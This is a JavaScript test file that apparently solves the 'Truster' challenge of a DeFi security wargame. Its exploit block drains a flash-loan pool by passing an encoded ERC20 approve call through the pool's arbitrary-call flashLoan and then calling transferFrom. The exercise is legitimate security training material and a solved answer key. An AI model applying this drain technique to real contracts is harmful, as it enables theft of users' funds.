const {ethers} = require("hardhat");
const {expect} = require("chai");

const ERC20 = require("@openzeppelin/contracts/build/contracts/ERC20.json");
const IERC20 = new ethers.utils.Interface(JSON.stringify(ERC20.abi));

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory("DamnValuableToken", deployer);
    const TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool", deployer);

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // create func signature and encoded params
    const signature = "approve(address,uint256)";
    const parameters = [attacker.address, TOKENS_IN_POOL];
    const encodedData = IERC20.encodeFunctionData(signature, parameters);

    // encoded data set approval for attack contract
    await this.pool.flashLoan(0, attacker.address, this.token.address, encodedData);
    expect(await this.token.allowance(this.pool.address, attacker.address)).to.eq(TOKENS_IN_POOL);

    // initiate token transfer
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
